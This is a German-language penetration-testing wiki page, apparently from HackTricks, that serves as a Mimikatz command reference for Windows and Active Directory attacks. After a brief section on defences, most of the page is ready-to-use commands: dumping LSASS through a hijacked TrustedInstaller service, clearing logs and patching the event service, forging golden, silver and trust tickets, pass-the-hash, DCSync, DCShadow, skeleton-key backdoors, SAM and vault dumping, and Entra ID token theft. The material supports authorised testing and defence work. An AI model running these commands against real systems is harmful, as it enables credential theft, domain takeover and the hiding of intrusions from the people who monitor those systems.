# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Diese Seite basiert auf einer Seite von [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Weitere Informationen findest du im Original!<sup>[[3]](#references)</sup>

## LM und Klartext im Arbeitsspeicher

Ab Windows 8.1 und Windows Server 2012 R2 wurden erhebliche Maßnahmen zum Schutz vor dem Diebstahl von Zugangsdaten eingeführt:

- **LM-Hashes und Klartextpasswörter** werden zur Erhöhung der Sicherheit nicht mehr im Arbeitsspeicher gespeichert. Eine bestimmte Registrierungseinstellung, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, muss mit einem DWORD-Wert von `0` konfiguriert werden, um Digest Authentication zu deaktivieren und sicherzustellen, dass keine „Klartext“-Passwörter in LSASS zwischengespeichert werden.

- **LSA Protection** schützt den Prozess Local Security Authority (LSA) vor unbefugtem Auslesen des Arbeitsspeichers und Code-Injection. Dazu wird LSASS als geschützter Prozess gekennzeichnet. LSA Protection wird wie folgt aktiviert:
  1. Ändere die Registrierung unter _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, indem du `RunAsPPL` auf `dword:00000001` setzt.
  2. Implementiere ein Group Policy Object (GPO), das diese Registrierungsänderung auf allen verwalteten Geräten erzwingt.

Trotz dieser Schutzmaßnahmen können Tools wie Mimikatz LSA Protection mithilfe bestimmter Treiber umgehen. Solche Aktionen werden jedoch wahrscheinlich in Ereignisprotokollen aufgezeichnet.

Auf modernen Workstations ist dies noch wichtiger, da **Credential Guard auf vielen in eine Domäne eingebundenen Windows 11 22H2+- und Windows Server 2025-Systemen, die keine Domänencontroller sind, standardmäßig aktiviert ist**, während **LSASS-as-PPL bei Neuinstallationen von Windows 11 22H2+ standardmäßig aktiviert ist**. In der Praxis bedeutet das, dass `sekurlsa::logonpasswords` oft weniger Daten liefert, als ältere Angriffstechniken erwarten ließen, und Operatoren zunehmend auf **offline minidumps**, **Kerberos-Schlüsselextraktion (`sekurlsa::ekeys`)** oder **CloudAP-/PRT-orientierte Module** ausweichen. Informationen zu den Schutzmaßnahmen findest du unter [Windows credentials protections](credentials-protections.md).

### SeDebugPrivilege-Entfernung entgegenwirken

Administratoren verfügen typischerweise über SeDebugPrivilege, das ihnen das Debuggen von Programmen ermöglicht. Dieses Privileg kann eingeschränkt werden, um unbefugte Speicherabbilder zu verhindern – eine gängige Technik, mit der Angreifer Zugangsdaten aus dem Arbeitsspeicher extrahieren. Doch selbst wenn dieses Privileg entfernt wurde, kann das TrustedInstaller-Konto mithilfe einer angepassten Dienstkonfiguration weiterhin Speicherabbilder erstellen:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Dies ermöglicht das Dumpen des Speichers von `lsass.exe` in eine Datei, die anschließend auf einem anderen System analysiert werden kann, um Zugangsdaten zu extrahieren:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz-Optionen

Die Manipulation von Ereignisprotokollen mit Mimikatz umfasst zwei primäre Aktionen: das Löschen von Ereignisprotokollen und das Patchen des Event-Dienstes, um die Protokollierung neuer Ereignisse zu verhindern. Nachfolgend finden Sie die Befehle für diese Aktionen:

#### Ereignisprotokolle löschen

Mimikatz stellt `event::clear` bereit. Der Befehl ruft die Windows-API zum Löschen von Ereignisprotokollen für das ausgewählte klassische Protokoll auf. Standardmäßig wird `Security` verwendet; mit `/log:` wird ein anderes Protokoll ausgewählt. Der Aufrufer benötigt die entsprechenden Rechte, um es zu löschen. Dies ist nicht dasselbe wie `event::drop`, das versucht, das Schreiben neuer Einträge zu verhindern.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Experimentelle Funktion: Patchen des Event Service

- **Befehl**: `event::drop`
- Dieser experimentelle Befehl ist dafür vorgesehen, das Verhalten des Event Logging Service zu ändern und ihn dadurch effektiv daran zu hindern, neue Ereignisse aufzuzeichnen.
- Beispiel: `mimikatz "privilege::debug" "event::drop" exit`

- Der Befehl `privilege::debug` stellt sicher, dass Mimikatz über die erforderlichen Berechtigungen zum Ändern von Systemdiensten verfügt.
- Der Befehl `event::drop` patcht anschließend den Event Logging Service.

### Kerberos-Ticket-Angriffe

Verwenden Sie die folgenden Befehle als schnelle Syntaxreferenz. Die speziellen Seiten zu [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) und [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) enthalten die aktuellen AES-/PAC-/opsec-Hinweise.

### Golden Ticket erstellen

Ein Golden Ticket ermöglicht die Impersonation mit domänenweitem Zugriff. Wichtiger Befehl und Parameter:

- Befehl: `kerberos::golden`
- Parameter:
  - `/domain`: Der Domänenname.
  - `/sid`: Der Security Identifier (SID) der Domäne.
  - `/user`: Der zu imitierende Benutzername.
  - `/krbtgt`: Der NTLM-Hash des KDC-Dienstkontos der Domäne.
  - `/ptt`: Injiziert das Ticket direkt in den Arbeitsspeicher.
  - `/ticket`: Speichert das Ticket zur späteren Verwendung.

Beispiel:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Erstellung eines Silver Tickets

Silver Tickets gewähren Zugriff auf bestimmte Dienste. Wichtiger Befehl und wichtige Parameter:

- Befehl: Ähnlich wie beim Golden Ticket, aber auf bestimmte Dienste ausgerichtet.
- Parameter:
  - `/service`: Der Zieldienst (z. B. cifs, http).
  - Weitere Parameter ähnlich wie beim Golden Ticket.

Beispiel:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket-Erstellung

Trust Tickets werden verwendet, um über Vertrauensbeziehungen auf Ressourcen in anderen Domains zuzugreifen. Wichtige Befehle und Parameter:

- Befehl: Ähnlich wie Golden Ticket, aber für Vertrauensbeziehungen.
- Parameter:
  - `/target`: Der FQDN der Zieldomain.
  - `/rc4`: Der NTLM-Hash des Trust-Kontos.

Beispiel:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Zusätzliche Kerberos-Befehle

- **Tickets auflisten**:

  - Befehl: `kerberos::list`
  - Listet alle Kerberos-Tickets für die aktuelle Benutzersitzung auf.

- **Pass the Cache**: `kerberos::ptc` liest eine MIT/Heimdal-`.ccache`-Datei, **keine** `.kirbi`-Datei. Gib den Dateipfad als Positionsargument an: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` liest eine `.kirbi`-Datei oder ein Verzeichnis mit solchen Dateien. Auch hier wird ein Pfad als Positionsargument angegeben, nicht `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Weitere Informationen zum umfassenderen Workflow findest du unter [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md).<sup>[[6]](#references)</sup>

- **Tickets löschen**:
  - Befehl: `kerberos::purge`
  - Löscht alle Kerberos-Tickets aus der Sitzung.
  - Nützlich vor der Verwendung von Ticket-Manipulationsbefehlen, um Konflikte zu vermeiden.

### Over-Pass-the-Hash / Pass-the-Key

Wenn `RC4` deaktiviert oder unzuverlässig ist, kann Mimikatz **AES128/AES256-Kerberos-Schlüssel** in die aktuelle Anmeldesitzung patchen, anstatt nur einen NT-Hash zu verwenden. Für moderne Domänen ist dies in der Regel besser geeignet, als `sekurlsa::pth` als ausschließlich NTLM-basiert zu betrachten.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` verwendet den aktuellen Prozess erneut, anstatt eine neue Konsole zu starten. Das ist praktisch, wenn du Dinge wie `lsadump::dcsync` sofort im selben Kontext ausführen möchtest.

### Active-Directory-Manipulation

- **DCShadow**: Eine Maschine vorübergehend als DC agieren lassen, um AD-Objekte zu manipulieren. Siehe [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Einen DC imitieren, um Passwortdaten anzufordern. Siehe [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Zugriff auf Anmeldedaten

- **LSADUMP::LSA**: Anmeldedaten aus der LSA extrahieren.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Einen DC mithilfe der Passwortdaten eines Computerkontos imitieren.

  - _Im ursprünglichen Kontext ist kein spezieller Befehl für NetSync angegeben._

- **LSADUMP::SAM**: Auf die lokale SAM-Datenbank zugreifen.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: In der Registry gespeicherte Geheimnisse entschlüsseln.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Einen neuen NTLM-Hash für einen Benutzer festlegen.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Authentifizierungsinformationen zu Vertrauensstellungen abrufen.
  - `mimikatz "lsadump::trust" exit`

### Cloud-Anmeldedaten / Entra ID

Auf **Entra ID**- oder **hybrid-joined**-Hosts kann `sekurlsa::cloudap` zwischengespeichertes **Primary Refresh Token (PRT)**-Material aus LSASS offenlegen. `ProofOfPossesionKey.KeyValue` ist der durch DPAPI geschützte Blob des Sitzungsschlüssels, nicht der bereits entschlüsselte Schlüssel.<sup>[[7]](#references)[[8]](#references)</sup> Um `/unprotect` zu verwenden, führe `dpapi::cloudapkd` als `SYSTEM` aus (zum Beispiel `token::elevate` in einer erhöhten Mimikatz-Sitzung), oder fülle zunächst Mimikatz' Schlüssel-Cache mit `sekurlsa::dpapi`. `privilege::debug` allein wechselt nicht den DPAPI-Aufrufkontext.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Kopiere den **übereinstimmenden** `Context` und `Derived Key` aus dem ersten Befehl in den zweiten; Mimikatz erzeugt einen neuen Context, wenn keiner angegeben wird. Selbst bei einem TPM-geschützten Schlüssel kann Mimikatz mithilfe des TPM auf dem ursprünglichen Gerät einen Signaturschlüssel ableiten. Der Klartextschlüssel muss nicht exportiert werden, aber ein erfolgreiches Ergebnis für den abgeleiteten Schlüssel kann ein Browser-Cookie signieren.<sup>[[7]](#references)</sup>

Ein PRT-String allein reicht nicht aus, da Microsoft Entra den Besitznachweis des zugehörigen Sitzungsschlüssels verlangt.<sup>[[9]](#references)</sup> Siehe [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) zu weiteren Optionen für Master Keys und [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) zur Cloud-seitigen Angriffskette.

### Sonstiges

- **MISC::Skeleton**: Eine Backdoor in LSASS auf einem DC injizieren.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Rechteausweitung

- **PRIVILEGE::Backup**: Backup-Rechte erlangen.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug-Rechte erlangen.
  - `mimikatz "privilege::debug" exit`

### Zugangsdaten auslesen

- **SEKURLSA::LogonPasswords**: Zugangsdaten angemeldeter Benutzer anzeigen.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kerberos-Tickets aus dem Speicher extrahieren.
  - `mimikatz "sekurlsa::tickets /export" exit`

### SID- und Token-Manipulation

- **SID::add/modify**: SID und SIDHistory ändern.

  - Hinzufügen: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Ändern: _Im ursprünglichen Kontext ist kein spezieller Befehl zum Ändern angegeben._

- **TOKEN::Elevate**: Tokens imitieren.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminaldienste

- **TS::MultiRDP**: Mehrere RDP-Sitzungen zulassen.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS-/RDP-Sitzungen auflisten.
  - _Im ursprünglichen Kontext ist kein spezieller Befehl für TS::Sessions angegeben._

### Vault

- Kennwörter aus Windows Vault extrahieren.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz-Module](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB und Entra ID: Begrüßen Sie Ihren neuen Cache-Flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz-Befehlsreferenz](https://adsecurity.org/?page_id=1821)
- [4] [Quellcode des Mimikatz-Event-Moduls](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Quellcode des Mimikatz-ccache-Moduls](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Quellcode des Mimikatz-Kerberos-Moduls](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz-Implementierung von CloudAP DPAPI](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Ein tieferer Einblick in den Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Schutz des Microsoft Entra Primary Refresh Token](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
